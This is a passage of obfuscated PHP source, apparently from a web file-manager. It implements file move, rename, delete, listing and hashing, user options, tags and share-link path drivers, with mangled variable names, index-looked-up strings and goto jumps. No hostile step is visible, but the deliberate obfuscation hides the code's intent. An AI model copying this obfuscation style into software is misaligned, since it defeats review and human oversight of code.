$şãÏèª’ ? $this->getPathOuter($Ğñ¦—†°) : !1; } public function moveFile($œí¡éØ, $àÉÖè¿) { $this->mkdir($this->pathFather($àÉÖè¿)); $œí¡éØ = $this->iconvSystem($œí¡éØ); $àÉÖè¿ = $this->iconvSystem($àÉÖè¿); $ÄûáÙØ· = intval(@rename($œí¡éØ, $àÉÖè¿)); if (!$ÄûáÙØ·) { if ($ÄûáÙØ· = intval(@copy_64($œí¡éØ, $àÉÖè¿))) { @unlink($œí¡éØ); } } @chmod($àÉÖè¿, $this->pathAuth); return $ÄûáÙØ· ? $this->getPathOuter($àÉÖè¿) : !1; } public function movePath($·ó·‘Åò, $Åñ×¡”, $š©§Á‘´ = false) { $œçÊ»µ„ =& $_SERVER[şÒÁøÒÄ]; $·ó·‘Åò = $this->iconvSystem($·ó·‘Åò); $Åñ×¡” = $this->iconvSystem($Åñ×¡”); $œñÈæËÍ = rtrim($Åñ×¡”, $œçÊ»µ„[8]) . $œçÊ»µ„[8] . ($š©§Á‘´ ? $š©§Á‘´ : get_path_this($·ó·‘Åò)); if (file_exists($œñÈæËÍ)) { return !1; } $ÓĞâê¾ì = intval(@rename($·ó·‘Åò, $œñÈæËÍ)); $ÓĞâê¾ì = file_exists($œñÈæËÍ); return $ÓĞâê¾ì ? $this->getPathOuter($œñÈæËÍ) : !1; } public function delFile($À¶Í¶†) { $À¶Í¶† = $this->iconvSystem($À¶Í¶†); if (!@unlink($À¶Í¶†)) { @chmod($À¶Í¶†, $this->pathAuth); if (!@unlink($À¶Í¶†)) { return !1; } } else { return !0; } } public function delFolder($ÈÄÉ®ú) { $õì°¡ˆ =& $_SERVER[şÒÁøÒÄ]; $ÈÄÉ®ú = $this->iconvSystem($ÈÄÉ®ú); if (!is_dir($ÈÄÉ®ú)) { return !0; } if (!($•æäÌáÈ = opendir($ÈÄÉ®ú))) { return !1; } while (($şöóØ˜ = readdir($•æäÌáÈ)) !== !1) { if ($şöóØ˜ == $õì°¡ˆ[10] || $şöóØ˜ == $õì°¡ˆ[1401]) { continue; } $ˆÔ§÷–™ = $ÈÄÉ®ú . $õì°¡ˆ[8] . $şöóØ˜; if (is_file($ˆÔ§÷–™) || is_link($ˆÔ§÷–™)) { if (!unlink($ˆÔ§÷–™)) { chmod($ˆÔ§÷–™, $this->pathAuth); if (!unlink($ˆÔ§÷–™)) { return !1; } } } else { if (is_dir($ˆÔ§÷–™)) { chmod($ˆÔ§÷–™, $this->pathAuth); $ˆÔ§÷–™ = $this->iconvApp($ˆÔ§÷–™); if (!$this->delFolder($ˆÔ§÷–™)) { return !1; } } } } closedir($•æäÌáÈ); return rmdir($ÈÄÉ®ú); } public function rename($ø„ÔÃ, $ÆÚêüŞÏ) { $¨íÅÆìŸ =& $_SERVER[şÒÁøÒÄ]; $¼¿È¦–‚ = $this->fileNameAuto($this->pathFather($ø„ÔÃ), $ÆÚêüŞÏ); $¼¿È¦–‚ = $this->iconvSystem($¼¿È¦–‚); $ø„ÔÃ = $this->iconvSystem($ø„ÔÃ); $Ÿı°•æ = $this->pathFather($ø„ÔÃ); $¥ƒ·§ä½ = rtrim($Ÿı°•æ, $¨íÅÆìŸ[8]) . $¨íÅÆìŸ[8] . $¼¿È¦–‚; $í’™¢Ü¨ = @rename($ø„ÔÃ, $¥ƒ·§ä½); $¥ƒ·§ä½ = $this->iconvApp($¥ƒ·§ä½); return $í’™¢Ü¨ ? $this->getPathOuter($¥ƒ·§ä½) : !1; } public function size($¤ûÉÖ¢ı) { $¤ûÉÖ¢ı = $this->iconvSystem($¤ûÉÖ¢ı); return filesize_64($¤ûÉÖ¢ı); } public function info($‚¦¡…‰ï) { $‚¦¡…‰ï = $this->iconvSystem($‚¦¡…‰ï); if ($this->isFolder($‚¦¡…‰ï)) { return $this->folderInfo($‚¦¡…‰ï); } else { if ($this->isFile($‚¦¡…‰ï)) { return $this->fileInfo($‚¦¡…‰ï); } } return !1; } protected function infoChildren($ªå¨äÓ, &$î‹øÉÆ¶, $ûÙßÒ¸ß = true) { $™·Å‰›ã =& $_SERVER[şÒÁøÒÄ]; check_abort_echo(); $ªå¨äÓ = rtrim($ªå¨äÓ, $™·Å‰›ã[8]) . $™·Å‰›ã[8]; if ($ûÙßÒ¸ß) { $ªå¨äÓ = $this->iconvSystem($ªå¨äÓ); } if (!($­ûŸ÷° = @opendir($ªå¨äÓ))) { return; } while (($Óú»ÇÄ = readdir($­ûŸ÷°)) !== !1) { if ($Óú»ÇÄ == $™·Å‰›ã[10] || $Óú»ÇÄ == $™·Å‰›ã[1401]) { continue; } $¤íá¬ëô = $ªå¨äÓ . $Óú»ÇÄ; if (is_file($¤íá¬ëô) || is_link($¤íá¬ëô)) { $î‹øÉÆ¶[$™·Å‰›ã[77]]++; $î‹øÉÆ¶[$™·Å‰›ã[76]] += filesize_64($¤íá¬ëô); } else { if (is_dir($¤íá¬ëô)) { $î‹øÉÆ¶[$™·Å‰›ã[78]]++; $this->infoChildren($¤íá¬ëô, $î‹øÉÆ¶, !1); } } } closedir($­ûŸ÷°); } private function folderInfo($ú™¶Ûòº, $Çà¨õ¦ = false) { $Û×ğ¡³í =& $_SERVER[şÒÁøÒÄ]; $ú™¶Ûòº = rtrim($ú™¶Ûòº, $Û×ğ¡³í[8]) . $Û×ğ¡³í[8]; $¼ù¶‘ = $this->iconvApp($this->pathThis($ú™¶Ûòº)); if ($Çà¨õ¦) { return array($Û×ğ¡³í[32] => $¼ù¶‘, $Û×ğ¡³í[84] => $this->getPathOuter($ú™¶Ûòº), $Û×ğ¡³í[33] => $Û×ğ¡³í[75]); } $‹Ûê½Ü§ = array($Û×ğ¡³í[32] => $¼ù¶‘, $Û×ğ¡³í[84] => $this->getPathOuter($ú™¶Ûòº), $Û×ğ¡³í[33] => $Û×ğ¡³í[75], $Û×ğ¡³í[201] => @filectime($ú™¶Ûòº), $Û×ğ¡³í[85] => @filemtime($ú™¶Ûòº), $Û×ğ¡³í[1404] => @fileatime($ú™¶Ûòº), $Û×ğ¡³í[1405] => is_readable($ú™¶Ûòº), $Û×ğ¡³í[1406] => is_writable($ú™¶Ûòº), $Û×ğ¡³í[1407] => get_mode($ú™¶Ûòº)); return $‹Ûê½Ü§; } private function fileInfo($½‰Î¶„¯, $ô³ŒÛ¢ = false) { $‘ŞÊ®Òã =& $_SERVER[şÒÁøÒÄ]; $ş€ß´ = $this->iconvApp($this->pathThis($½‰Î¶„¯)); if ($ô³ŒÛ¢) { return array($‘ŞÊ®Òã[32] => $ş€ß´, $‘ŞÊ®Òã[84] => $this->getPathOuter($½‰Î¶„¯), $‘ŞÊ®Òã[33] => $‘ŞÊ®Òã[200], $‘ŞÊ®Òã[76] => $this->size($½‰Î¶„¯), $‘ŞÊ®Òã[174] => $this->ext($ş€ß´)); } $ÉòˆõôÜ = array($‘ŞÊ®Òã[32] => $ş€ß´, $‘ŞÊ®Òã[84] => $this->getPathOuter($½‰Î¶„¯), $‘ŞÊ®Òã[33] => $‘ŞÊ®Òã[200], $‘ŞÊ®Òã[201] => @filectime($½‰Î¶„¯), $‘ŞÊ®Òã[85] => @filemtime($½‰Î¶„¯), $‘ŞÊ®Òã[1404] => @fileatime($½‰Î¶„¯), $‘ŞÊ®Òã[76] => $this->size($½‰Î¶„¯), $‘ŞÊ®Òã[174] => $this->ext($ş€ß´), $‘ŞÊ®Òã[1405] => is_readable($½‰Î¶„¯), $‘ŞÊ®Òã[1406] => is_writable($½‰Î¶„¯), $‘ŞÊ®Òã[1407] => get_mode($½‰Î¶„¯)); return $ÉòˆõôÜ; } public function exist($ƒÅ˜­†) { $ƒÅ˜­† = $this->iconvSystem($ƒÅ˜­†); return @file_exists($ƒÅ˜­†); } public function isFile($üìáƒå ) { $üìáƒå  = $this->iconvSystem($üìáƒå ); return @is_file($üìáƒå ); } public function isFolder($®ã„õıí) { $®ã„õıí = $this->iconvSystem($®ã„õıí); return @is_dir($®ã„õıí); } public function listPath($ŠÌ‹Í°¾, $—Àñ®·Ğ = false) { $Éí‰«÷© =& $_SERVER[şÒÁøÒÄ]; $ŠÌ‹Í°¾ = $this->iconvSystem($ŠÌ‹Í°¾); $ŠÌ‹Í°¾ = rtrim($ŠÌ‹Í°¾, $Éí‰«÷©[8]) . $Éí‰«÷©[8]; $Ê…†âÓ = array($Éí‰«÷©[82] => array(), $Éí‰«÷©[83] => array()); if (!($ÑËñÔ©É = @opendir($ŠÌ‹Í°¾))) { return $Ê…†âÓ; } while (($ôĞÀŞ‚Ø = readdir($ÑËñÔ©É)) !== !1) { if ($ôĞÀŞ‚Ø == $Éí‰«÷©[10] || $ôĞÀŞ‚Ø == $Éí‰«÷©[1401]) { continue; } $›«ã“’ë = $ŠÌ‹Í°¾ . $ôĞÀŞ‚Ø; if (is_file($›«ã“’ë)) { $Ê…†âÓ[$Éí‰«÷©[83]][] = $this->fileInfo($›«ã“’ë, $—Àñ®·Ğ); } else { $Ê…†âÓ[$Éí‰«÷©[82]][] = $this->folderInfo($›«ã“’ë, $—Àñ®·Ğ); } } closedir($ÑËñÔ©É); return $Ê…†âÓ; } public function listAll($¯ú÷´Æ, &$Ô²¸Å = array()) { $¿¡ŠÚ¿à =& $_SERVER[şÒÁøÒÄ]; $¯ú÷´Æ = $this->iconvSystem($¯ú÷´Æ); $¯ú÷´Æ = rtrim($¯ú÷´Æ, $¿¡ŠÚ¿à[8]) . $¿¡ŠÚ¿à[8]; if (!($é»ÓÏ¶ = @opendir($¯ú÷´Æ))) { return $Ô²¸Å; } while (($ƒä›ÎÁØ = readdir($é»ÓÏ¶)) !== !1) { if ($ƒä›ÎÁØ == $¿¡ŠÚ¿à[10] || $ƒä›ÎÁØ == $¿¡ŠÚ¿à[1401]) { continue; } $ÛÊ±†Ÿ = $¯ú÷´Æ . $ƒä›ÎÁØ; $âéÆ²°« = is_dir($ÛÊ±†Ÿ) && !is_link($ÛÊ±†Ÿ) ? 1 : 0; $ÛÊ±†Ÿ = $âéÆ²°« ? $ÛÊ±†Ÿ . $¿¡ŠÚ¿à[8] : $ÛÊ±†Ÿ; $Ô²¸Å[] = array($¿¡ŠÚ¿à[84] => $ÛÊ±†Ÿ, $¿¡ŠÚ¿à[75] => $âéÆ²°«, $¿¡ŠÚ¿à[85] => intval(@filemtime($ÛÊ±†Ÿ)), $¿¡ŠÚ¿à[76] => $âéÆ²°« ? 0 : intval($this->size($ÛÊ±†Ÿ))); if ($âéÆ²°«) { $this->listAll($ÛÊ±†Ÿ, $Ô²¸Å); } } closedir($é»ÓÏ¶); return $Ô²¸Å; } public function has($ŞùÆ’ãö, $Ì…¬¨Ü‹ = false, $²ºèÈ› = true) { $Ö¯¤Òæ =& $_SERVER[şÒÁøÒÄ]; $ŞùÆ’ãö = $this->iconvSystem($ŞùÆ’ãö); $ŞùÆ’ãö = rtrim($ŞùÆ’ãö, $Ö¯¤Òæ[8]) . $Ö¯¤Òæ[8]; if (!($ÉõçáßË = @opendir($ŞùÆ’ãö))) { return !1; } $îıÍ´¹ = 0; $ÍÑòğ°„ = 0; $£ªÊÂÒ¢ = 0; while (($úÊôÚÉ = readdir($ÉõçáßË)) !== !1) { if ($úÊôÚÉ == $Ö¯¤Òæ[10] || $úÊôÚÉ == $Ö¯¤Òæ[1401]) { continue; } $±øòÚ¨ = $ŞùÆ’ãö . $úÊôÚÉ; if ($Ì…¬¨Ü‹) { $£ªÊÂÒ¢++; if (@is_file($±øòÚ¨)) { $îıÍ´¹++; } else { $ÍÑòğ°„++; } if ($£ªÊÂÒ¢ > 10000) { break; } continue; } if ($²ºèÈ›) { if (@is_file($±øòÚ¨)) { return !0; } } else { if (@is_dir($±øòÚ¨ . $Ö¯¤Òæ[8])) { return !0; } } } closedir($ÉõçáßË); if ($Ì…¬¨Ü‹) { return array($Ö¯¤Òæ[207] => $îıÍ´¹, $Ö¯¤Òæ[208] => $ÍÑòğ°„); } return !1; } public function hashSimple($şÏ•Ù´­) { $×İ¨ƒÁç =& $_SERVER[şÒÁøÒÄ]; if (!$şÏ•Ù´­) { return md5($×İ¨ƒÁç[12]); } $şÏ•Ù´­ = $this->iconvSystem($şÏ•Ù´­); $ÕùåÔ×… = $this->size($şÏ•Ù´­); $ÕıÓ¢°ü = 200; $™×îÈéŠ = 50; if ($ÕùåÔ×… <= $ÕıÓ¢°ü * $™×îÈéŠ) { return $this->hashMd5($şÏ•Ù´­) . $ÕùåÔ×…; } $æ‚¶Šè€ = $×İ¨ƒÁç[12]; $ôëÁÃÉß = intval($ÕùåÔ×… / $™×îÈéŠ); $”öõš = fopen($şÏ•Ù´­, $×İ¨ƒÁç[1408]); if (!$”öõš) { return $æ‚¶Šè€; } for ($É†—¤™È = 0; $É†—¤™È < $™×îÈéŠ; $É†—¤™È++) { fseek_64($”öõš, $ôëÁÃÉß * $É†—¤™È); $æ‚¶Šè€ .= fread($”öõš, $ÕıÓ¢°ü); } fseek_64($”öõš, $ÕùåÔ×… - $ÕıÓ¢°ü); $æ‚¶Šè€ .= fread($”öõš, $ÕıÓ¢°ü); fclose($”öõš); return md5($æ‚¶Šè€) . $ÕùåÔ×…; } public function getContent($©‚¸ƒ®ó) { $©‚¸ƒ®ó = $this->iconvSystem($©‚¸ƒ®ó); return file_get_contents($©‚¸ƒ®ó); } public function setContent($ÌÖ«—§…, $ê¼ôÅÍç = '') { $ÌÖ«—§… = $this->iconvSystem($ÌÖ«—§…); $·«ïíƒÖ = @file_put_contents($ÌÖ«—§…, $ê¼ôÅÍç, LOCK_EX); clearstatcache(); @chmod($ÌÖ«—§…, $this->pathAuth); return $·«ïíƒÖ === !1 ? !1 : !0; } public function fileSubstr($¤Éòñ´˜, $ŠÌ—æß® = 0, $˜‚ãÔ®Â = false) { $äã×õ í =& $_SERVER[şÒÁøÒÄ]; $¤Éòñ´˜ = $this->iconvSystem($¤Éòñ´˜); if ($˜‚ãÔ®Â === !1) { $˜‚ãÔ®Â = $this->size($¤Éòñ´˜); } if ($˜‚ãÔ®Â <= 0) { return $äã×õ í[12]; } $»£âï†Î = fopen($¤Éòñ´˜, $äã×õ í[1408]); if (!$»£âï†Î) { return !1; } fseek_64($»£âï†Î, $ŠÌ—æß®); $ë¿®–»† = fread($»£âï†Î, $˜‚ãÔ®Â); fclose($»£âï†Î); return $ë¿®–»†; } public function upload($„‹ßŞ×Š, $Õ™óØâ, $ÁôŠÏÈ = false, $óŞ™„ëØ = REPEAT_REPLACE) { if ($ÁôŠÏÈ) { return $this->moveFile($Õ™óØâ, $„‹ßŞ×Š); } return $this->copyFile($Õ™óØâ, $„‹ßŞ×Š); } public function setModifyTime($ÓÁˆë£é, $‚ıä—Éâ = '') { @touch($ÓÁˆë£é, intval($‚ıä—Éâ)); } public function download($ßß÷—–‹, $üÑĞ²Üö) { return $this->iconvSystem($ßß÷—–‹); } } goto F½ŞÂ‹Ùàà; Bäá†·ñ¿: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\137\x6f\x70\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($÷ƒÒÔÚî) { return "\x55\163\x65\x72\x4f\160\x74\151\157\156\x5f{$÷ƒÒÔÚî}\x5f" . USER_ID; } protected function filterWhere($çÜÒŸ®) { $çÜÒŸ®[$_SERVER[şÒÁøÒÄ][1680]] = USER_ID; return $çÜÒŸ®; } public function cacheRemoveUser($’Îş—¾«, $×Ìãã¬™) { return Cache::remove("\x55\163\145\162\x4f\x70\x74\151\157\x6e\x5f{$’Îş—¾«}\137" . $×Ìãã¬™); } protected function optionDefault($Ğ½äÎšî = '') { $ÉÎÔĞ =& $_SERVER[şÒÁøÒÄ]; if ($Ğ½äÎšî == $ÉÎÔĞ[12]) { return $GLOBALS[$ÉÎÔĞ[6]][$ÉÎÔĞ[2360]]; } if ($Ğ½äÎšî == $ÉÎÔĞ[2361]) { return $GLOBALS[$ÉÎÔĞ[6]][$ÉÎÔĞ[2362]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\x2e\164\x61\x67\x4c\x69\x73\x74"; public $modelType = "\x55\x73\x65\x72\117\160\x74\x69\157\x6e"; public $field = array("\x6e\141\x6d\145", "\x73\164\171\154\145", "\x73\157\162\x74"); public function listData($Æ’È»™ú = false, $ƒ×äÂÕ = "\163\x6f\162\x74", $×éû¿ª = false) { return parent::listData($Æ’È»™ú, $ƒ×äÂÕ, $×éû¿ª); } public function remove($œşææ¬À) { return parent::remove($œşææ¬À); } public function add($ÃÃ£ù•Ã, $ĞÅ–€À = "\154\x61\x62\x65\154\x2d\147\162\145\x79\x2d\156\157\x72\x6d\x61\154") { $ƒÕÁÀçª =& $_SERVER[şÒÁøÒÄ]; if ($this->findByName($ÃÃ£ù•Ã)) { return !1; } $ª¿Öµø = array($ƒÕÁÀçª[420] => $ÃÃ£ù•Ã, $ƒÕÁÀçª[484] => $ĞÅ–€À, $ƒÕÁÀçª[1873] => $this->getSort($ƒÕÁÀçª[258]) + 1); return parent::insert($ª¿Öµø); } public function update($Ú˜¦ÙÎÆ, $¾Åğğüâ) { $şñ³ï”– =& $_SERVER[şÒÁøÒÄ]; $ºÌÒÍÈ” = $this->listData($Ú˜¦ÙÎÆ); $…Ù¬İ«× = $this->findByName($¾Åğğüâ[$şñ³ï”–[32]]); if (!$ºÌÒÍÈ” || $…Ù¬İ«× && $…Ù¬İ«×[$şñ³ï”–[399]] != $ºÌÒÍÈ”[$şñ³ï”–[399]]) { return !1; } return parent::update($Ú˜¦ÙÎÆ, $¾Åğğüâ); } public function moveTop($Ö³†à©ğ) { $§¿æşØ› =& $_SERVER[şÒÁøÒÄ]; $Öˆ“ÖÌ = parent::listData(); $³€ğß—› = $this->getSort($§¿æşØ›[257]); foreach ($Öˆ“ÖÌ as &$æûß’âî) { if ($æûß’âî[$§¿æşØ›[399]] == $Ö³†à©ğ) { $æûß’âî[$§¿æşØ›[1893]] = $³€ğß—›; continue; } $æûß’âî[$§¿æşØ›[1893]] += 1; } unset($æûß’âî); return parent::resetData($Öˆ“ÖÌ); } public function moveBottom($Ë”ì§Ò³) { $öîù’¬Ä =& $_SERVER[şÒÁøÒÄ]; $èÕà¿±® = $this->getSort($öîù’¬Ä[258]) + 1; return parent::update($Ë”ì§Ò³, array($öîù’¬Ä[1893] => $èÕà¿±®)); } public function resetSort($Ã›ïÉôÜ) { $•şñòÆœ =& $_SERVER[şÒÁøÒÄ]; $ÚæÀ­™Ã = array(); $Ã›ïÉôÜ = is_array($Ã›ïÉôÜ) ? $Ã›ïÉôÜ : array(); for ($†¢ıŞ¿ş = 0; $†¢ıŞ¿ş < count($Ã›ïÉôÜ); $†¢ıŞ¿ş++) { $ÚæÀ­™Ã[$Ã›ïÉôÜ[$†¢ıŞ¿ş] . $•şñòÆœ[12]] = $†¢ıŞ¿ş + 1; } $Àá ÇçÓ = parent::listData(); foreach ($Àá ÇçÓ as &$“ ¾Í¸½) { $©Å†˜Ôë = $ÚæÀ­™Ã[$“ ¾Í¸½[$•şñòÆœ[399]]]; $“ ¾Í¸½[$•şñòÆœ[1893]] = $©Å†˜Ôë ? $©Å†˜Ôë : $“ ¾Í¸½[$•şñòÆœ[1893]]; } unset($“ ¾Í¸½); return parent::resetData($Àá ÇçÓ); } private function getSort($­äúøã) { $ÀÏ•‚· =& $_SERVER[şÒÁøÒÄ]; $ºî²¸ = parent::listData(); $ªæ€ÍÃá = array_to_keyvalue($ºî²¸, $ÀÏ•‚·[12], $ÀÏ•‚·[1893]); if (!$ªæ€ÍÃá) { $ªæ€ÍÃá = array(0); } $Òª¥ÂÂë = $­äúøã == $ÀÏ•‚·[258] ? max($ªæ€ÍÃá) : min($ªæ€ÍÃá); return intval($Òª¥ÂÂë); } } goto c®×™×‰—Ø; f¦êâöŞµ¯: class PathDriverDbShareItem extends PathDriverDB { public function __construct($óŸø²‹š) { $this->pathParse = $óŸø²‹š; $this->model = Model($_SERVER[şÒÁøÒÄ][1352]); } public function getPathOuter($ş±ÑæúÑ) { $”Û­øÑá =& $_SERVER[şÒÁøÒÄ]; if (!$ş±ÑæúÑ) { return $ş±ÑæúÑ; } $¦ù˜Ì´Ï = $this->parse($ş±ÑæúÑ); return trim(KodIO::makeShare($this->pathParse[$”Û­øÑá[399]], $¦ù˜Ì´Ï[$”Û­øÑá[399]]), $”Û­øÑá[8]); } protected function infoParse($ÊÏé„ƒ, $åˆö­Çø = false, $¨ãîöŒ¬ = false) { $³ÆÉ¡Ôç =& $_SERVER[şÒÁøÒÄ]; $ìŸèûÙ = $this->pathParse[$³ÆÉ¡Ôç[399]]; $‹¿Î™ºš = trim($this->pathParse[$³ÆÉ¡Ôç[1181]], $³ÆÉ¡Ôç[8]); return Action($³ÆÉ¡Ôç[1360])->sharePathInfo($ìŸèûÙ, $‹¿Î™ºš, $åˆö­Çø); } public function infoFull($ŠĞ·¦ì¹) { $óºÛÑƒ¦ =& $_SERVER[şÒÁøÒÄ]; $˜Áì‹†Â = explode($óºÛÑƒ¦[8], trim($ŠĞ·¦ì¹, $óºÛÑƒ¦[8])); if (count($˜Áì‹†Â) > 1) { $¡Æèì· = implode($óºÛÑƒ¦[8], array_splice($˜Áì‹†Â, 1)); $íÀß§ò = $this->model->pathInfoByPath($˜Áì‹†Â[0], $¡Æèì·); if (!$íÀß§ò) { return !1; } $this->pathParse[$óºÛÑƒ¦[1181]] = $íÀß§ò[$óºÛÑƒ¦[402]]; } return $this->infoParse($ŠĞ·¦ì¹); } public function listAll($ƒëæĞå¾) { $Ì÷æ³úæ =& $_SERVER[şÒÁøÒÄ]; $§“ùÁÏÁ = IO::info($this->pathParse[$Ì÷æ³úæ[84]]); if (!$§“ùÁÏÁ) { return array(); } $‹ƒ©±Ô = $this->model->listAll($ƒëæĞå¾); $áÚ¿û×¨ = Model($Ì÷æ³úæ[592])->getInfo($§“ùÁÏÁ[$Ì÷æ³úæ[593]]); foreach ($‹ƒ©±Ô as &$ŠÁ … ù) { check_abort(); $ŠÁ … ù[$Ì÷æ³úæ[87]] = Action($Ì÷æ³úæ[1360])->_shareItemeParse($ŠÁ … ù[$Ì÷æ³úæ[87]], $áÚ¿û×¨); } unset($ŠÁ … ù); return $‹ƒ©±Ô; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($¨¡İâ·ì) { $this->pathParse = $¨¡İâ·ì; $this->model = Model($_SERVER[şÒÁøÒÄ][1352]); } protected function infoParse($•Ê¾³, $úƒ©ÂßÚ = false, $÷Œƒ·ş = false) { $“æ¾¢¡ =& $_SERVER[şÒÁøÒÄ]; return Action($“æ¾¢¡[1187])->sharePathInfo($this->pathParse[$“æ¾¢¡[84]], !0, $úƒ©ÂßÚ); } public function listPath($Õı‹ºÒã, $™ˆùÒŒª = false) { $Âçº‹ß =& $_SERVER[şÒÁøÒÄ]; $®”ùªáİ = parent::listPath($Õı‹ºÒã, $™ˆùÒŒª); if (!$®”ùªáİ) { return $®”ùªáİ; } if (is_array($®”ùªáİ[$Âçº‹ß[1361]])) { $®”ùªáİ[$Âçº‹ß[1361]] = Action($Âçº‹ß[1187])->shareItemInfo($®”ùªáİ[$Âçº‹ß[1361]]); } foreach ($®”ùªáİ as $Í­°ìÁ¢ => $ºÊÊÌÇ·) { if (!in_array($Í­°ìÁ¢, array($Âçº‹ß[83], $Âçº‹ß[82]))) { continue; } foreach ($ºÊÊÌÇ· as $¶ö«ôÔî => $½ˆ¢÷¬) { $®”ùªáİ[$Í­°ìÁ¢][$¶ö«ôÔî] = Action($Âçº‹ß[1187])->shareItemInfo($½ˆ¢÷¬); } } return $®”ùªáİ; } public function listAll($ÊıÍø¿µ) { $•ÀÏ©¦º =& $_SERVER[şÒÁøÒÄ]; $ì¿¯™ş· = IO::info($this->pathParse[$•ÀÏ©¦º[84]]); if (!$ì¿¯™ş·) { return array(); } $ÒäáÒüé = $this->model->listAll($ÊıÍø¿µ); foreach ($ÒäáÒüé as &$œãœİªè) { $œãœİªè[$•ÀÏ©¦º[87]] = Action($•ÀÏ©¦º[1187])->shareItemInfo($œãœİªè[$•ÀÏ©¦º[87]]); } unset($œãœİªè); return $ÒäáÒüé; } } class PathDriverDriverShareItem { public function __construct($² ¶ô±ô) { $this->pathParse = $² ¶ô±ô; } public function __call($„”İÆ“, $À§ØıŞ) { $İëÒéü† =& $_SERVER[şÒÁøÒÄ]; if (method_exists($this, $„”İÆ“)) { return; } $«Ó—Ğ¿ñ = call_user_func_array(array($İëÒéü†[1362], $„”İÆ“), $À§ØıŞ); $üûÃ‡ªï = array($İëÒéü†[1363], $İëÒéü†[1364], $İëÒéü†[1365], $İëÒéü†[1366], $İëÒéü†[546], $İëÒéü†[548], $İëÒéü†[1367], $İëÒéü†[107], $İëÒéü†[1368], $İëÒéü†[1369]); if (in_array($„”İÆ“, $üûÃ‡ªï)) { $«Ó—Ğ¿ñ = $this->getPathOuter($«Ó—Ğ¿ñ); } return $«Ó—Ğ¿ñ; } public function copy($é¥à£, $£¸©ÄÀ€, $ŸŸé˜›¶ = false, $ÄåÂÖæ‰ = false) { return $this->copyMove($é¥à£, $£¸©ÄÀ€, $ŸŸé˜›¶, $_SERVER[şÒÁøÒÄ][546], $ÄåÂÖæ‰); } public function move($¯×çõ–, $­×Ô“‘Ç, $Î¥å¸êŒ = false, $Ğ¸ÆÕ– = false) { return $this->copyMove($¯×çõ–, $­×Ô“‘Ç, $Î¥å¸êŒ, $_SERVER[şÒÁøÒÄ][548], $Ğ¸ÆÕ–); } private function copyMove($üÉ†ıô, $°æçˆÁ¤, $³°é›˜, $¬¥‰”Ã½, $õÍö«ëÍ = false) { $™Æ´­ş =& $_SERVER[şÒÁøÒÄ]; $í§È¥œ¯ = $°æçˆÁ¤; $±‹Â¨ŸÃ = IO::driverMake($°æçˆÁ¤); if ($±‹Â¨ŸÃ->pathParse[$™Æ´­ş[1164]]) { $°æçˆÁ¤ = $±‹Â¨ŸÃ->pathParse[$™Æ´­ş[1164]]; } else { $°æçˆÁ¤ = $í§È¥œ¯; } $œşÇõ³Ë = IO::copyMove($üÉ†ıô, $°æçˆÁ¤, $³°é›˜, $¬¥‰”Ã½, $õÍö«ëÍ); $œşÇõ³Ë = $this->getPathOuter($œşÇõ³Ë); return $œşÇõ³Ë; } public function pathThis($‚­‹‰‘») { return get_path_this($this->pathParse[$_SERVER[şÒÁøÒÄ][84]]); } public function pathFather($ó§‚êûÔ) { return get_path_father($this->pathParse[$_SERVER[şÒÁøÒÄ][84]]); } public function iconvSystem($×øÉî€¬) { return $×øÉî€¬; } protected function infoParse($«öÏã•Ì, $Ö™•×ÄÒ = false) { $¸à§À€ =& $_SERVER[şÒÁøÒÄ]; $ıŞÃñåË = $this->pathParse[$¸à§À€[486]][$¸à§À€[1188]] . $this->pathParse[$¸à§À€[1181]]; if ($Ö™•×ÄÒ) { $ÕŒšœŞ˜ = IO::infoWithChildren($ıŞÃñåË); } else { $ÕŒšœŞ˜ = IO::info($ıŞÃñåË); } $¯À±îÓÆ = $this->pathParse[$¸à§À€[486]]; return Action($¸à§À€[1360])->_shareItemeParse($ÕŒšœŞ˜, $¯À±îÓÆ); } public function listAll($šü©¬Ñ¦) { $Á¨ßÌ =& $_SERVER[şÒÁøÒÄ]; $Ã©Ä›¤ = IO::listAll($šü©¬Ñ¦); $ÜèøîÁ® = rtrim($this->pathParse[$Á¨ßÌ[486]][$Á¨ßÌ[1188]], $Á¨ßÌ[8]); foreach ($Ã©Ä›¤ as &$ÚÒ—è æ) { $ÚÒ—è æ[$Á¨ßÌ[84]] = $this->pathDriver . $Á¨ßÌ[8] . ltrim(substr($ÚÒ—è æ[$Á¨ßÌ[84]], strlen($ÜèøîÁ®)), $Á¨ßÌ[8]); } unset($ÚÒ—è æ); return $Ã©Ä›¤; } public function listAllSimple($¦ŞÒ®ô•, $©òß‰İ¯ = false) { $ú–»úµã =& $_SERVER[şÒÁøÒÄ]; $š¡ô½ÜŒ = $this->listAll($¦ŞÒ®ô•); $Î¿Íáîò = $this->pathParse[$ú–»úµã[421]]; if (trim($Î¿Íáîò, $ú–»úµã[8]) == trim(get_path_father($Î¿Íáîò), $ú–»úµã[8])) { $©òß‰İ¯ = !0; } return IO::init($ú–»úµã[12])->listAllSimpleMake($š¡ô½ÜŒ, $Î¿Íáîò, $©òß‰İ¯); } public function getPathOuter($üß‘Ôï¶) { $İÚÚƒ‚¨ =& $_SERVER[şÒÁøÒÄ]; $Ãé»‡ëØ = KodIO::parse($üß‘Ôï¶); if ($Ãé»‡ëØ[$İÚÚƒ‚¨[33]] == KodIO::KOD_SHARE_ITEM) { return $Ãé»‡ëØ[$İÚÚƒ‚¨[84]]; } $ÔËÌûèµ = KodIO::clear($üß‘Ôï¶); $¨òøÜ‡ = KodIO::clear($this->pathParse[$İÚÚƒ‚¨[486]][$İÚÚƒ‚¨[1188]]); $¹³ì–Ã = substr($ÔËÌûèµ, strlen($¨òøÜ‡)); if (substr($ÔËÌûèµ, 0, strlen($¨òøÜ‡)) != $¨òøÜ‡) { return !1; } return $this->pathParse[$İÚÚƒ‚¨[1182]] . $İÚÚƒ‚¨[8] . ltrim($¹³ì–Ã, $İÚÚƒ‚¨[8]); } public function getType() { $äëƒÃ¸½ =& $_SERVER[şÒÁøÒÄ]; $áîëšù§ = str_replace($äëƒÃ¸½[74], $äëƒÃ¸½[12], get_class($this)); return strtolower($áîëšù§); } public function isTypeObject($øãÃ‚â) { return IO::isTypeObject($øãÃ‚â); } public function info($Œ˜µ¢Ë) { return $this->infoParse($Œ˜µ¢Ë); } public function infoAuth($ë®²»Şé) { return $this->infoParse($ë®²»Şé); } public function infoWithChildren($•ÎÎŞ©Å) { return $this->infoParse($•ÎÎŞ©Å, !0); } public function 